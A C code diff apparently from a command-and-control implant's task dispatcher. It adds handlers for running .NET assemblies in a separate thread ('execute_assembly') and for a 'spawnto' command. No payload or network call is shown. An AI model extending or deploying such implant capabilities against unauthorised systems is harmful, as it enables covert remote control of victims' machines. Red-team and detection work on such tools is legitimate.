@@ -10,6 +10,8 @@
 #include "Tasks/Process.h"
 #include "Tasks/Download.h"
 #include "Tasks/Upload.h"
+#include "Tasks/InlineExecute.h"
+#include "Tasks/ExecuteAssembly.h"
 #include "Tasks/Token.h"
 #include "Tasks/Exit.h"
 
@@ -243,6 +245,53 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             _dbg("INLINE_EXECUTE_CMD was called");
             
             InlineExecute(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
+        case EXECUTE_ASSEMBLY_CMD:
+        {
+            _dbg("EXECUTE_ASSEMBLY_CMD was called");
+            
+            // Freed inside of thread function
+            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
+            if (!tp)
+            {
+                _err("Failed to allocate memory for task parameter.");
+                return;
+            }
+
+            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
+            if (!tp->TaskParser) {
+                _err("Failed to allocate memory for TaskParser.");
+                free(tp->TaskUuid);
+                LocalFree(tp);
+                return;
+            }
+
+            // Duplicate so we don't use values that are freed before the thread finishes
+            tp->TaskUuid = _strdup(taskUuid);
+            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
+
+            // Threaded so it doesn't block main thread (usually needs alot of requests).
+            HANDLE hThread = CreateThread(NULL, 0, ExecuteAssemblyThread, (LPVOID)tp, 0, NULL);
+            if (!hThread) {
+                _err("Failed to create execute_assembly thread");
+                free(tp->TaskUuid);
+                ParserDestroy(tp->TaskParser);
+                LocalFree(tp);
+            } else {
+                CloseHandle(hThread); // Let the thread run independently
+            }
+            
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_SPAWNTO
+        case SPAWNTO_CMD:
+        {
+            _dbg("SPAWNTO_CMD was called");
+            AgentSpawnto(taskUuid, taskParser);
             return;
         }
 #endif
